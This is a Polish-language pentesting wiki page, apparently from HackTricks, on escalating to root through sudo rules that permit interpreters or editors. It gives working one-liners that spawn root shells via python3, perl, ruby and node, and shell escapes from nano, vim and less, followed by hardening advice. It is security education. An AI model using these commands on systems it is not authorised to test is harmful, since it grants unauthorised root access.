# Nadużywanie poleceń Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpretery dozwolone przez Sudo

Jeśli `sudo -l` pozwala użytkownikowi uruchomić interpreter jako root, należy traktować to jako bezpośrednie wykonanie kodu. Interpretery są zaprojektowane do wykonywania dowolnego kodu, dlatego reguła zezwalająca na `python3`, `perl`, `ruby`, `lua`, `node` lub podobne pliki binarne jest zwykle równoważna z wykonaniem poleceń jako root, chyba że argumenty są ściśle ograniczone i sprawdzane.

Typowy przebieg analizy:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Inne przykłady interpreterów:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Dokładna ścieżka ma znaczenie. Jeśli reguła sudo zezwala na `/usr/bin/python3`, podczas weryfikacji użyj dokładnie tej ścieżki:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Edytory dozwolone przez Sudo

Jeśli `sudo -l` pozwala użytkownikowi uruchomić interaktywny edytor jako root, traktuj to jako powierzchnię wykonywania poleceń, a nie nieszkodliwe uprawnienie do edycji plików. Edytory często umożliwiają wykonywanie poleceń powłoki, odczytywanie dowolnych plików, zapisywanie dowolnych plików lub wywoływanie zewnętrznych helperów z poziomu edytora.

Typowy przebieg analizy:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Wykonywanie poleceń w Nano

Gdy `nano` jest dozwolone za pośrednictwem sudo, wykonywanie poleceń może być dostępne z poziomu interfejsu edytora:
```text
Ctrl+R
Ctrl+X
```
Następnie podaj polecenie takie jak:
```bash
id
/bin/sh
```
Na niektórych terminalach interaktywna powłoka może wymagać przekierowania standardowych strumieni:
```bash
reset; /bin/sh 1>&0 2>&0
```
Dokładna sekwencja klawiszy może różnić się w zależności od wersji nano i opcji kompilacji, ale problem bezpieczeństwa pozostaje ten sam: edytor działa jako root i może wywoływać zewnętrzne polecenia.

### Inne typowe wyjścia z edytora

Edytory w stylu Vim często udostępniają wykonywanie poleceń za pomocą `:!`:
```text
:!/bin/sh
```
Programy typu pager, takie jak `less`, mogą również umożliwiać wykonywanie poleceń powłoki:
```text
!/bin/sh
```
## Uwagi dotyczące ochrony

- Unikaj przyznawania interpreterów lub interaktywnych edytorów za pośrednictwem sudo.
- Preferuj stałe wrappery należące do użytkownika root, które wykonują jedną, ściśle określoną czynność administracyjną.
- Jeśli interpreter jest nieunikniony, ogranicz dokładną ścieżkę skryptu i zablokuj argumenty kontrolowane przez użytkownika, zapisywalne importy, `PYTHONPATH` oraz niebezpieczne zachowywanie środowiska.
- Jeśli wymagana jest edycja pliku, ogranicz dokładną ścieżkę pliku i rozważ użycie `sudoedit` z poprawionymi wersjami sudo oraz ścisłą obsługą środowiska.
- Przeanalizuj `SETENV`, `env_keep`, zapisywalne katalogi robocze, zapisywalne ścieżki modułów/importów, `NOEXEC`, `use_pty` oraz rejestrowanie, ale nie traktuj ich jako kompletnego sandboxa.

{{#include ../../banners/hacktricks-training.md}}
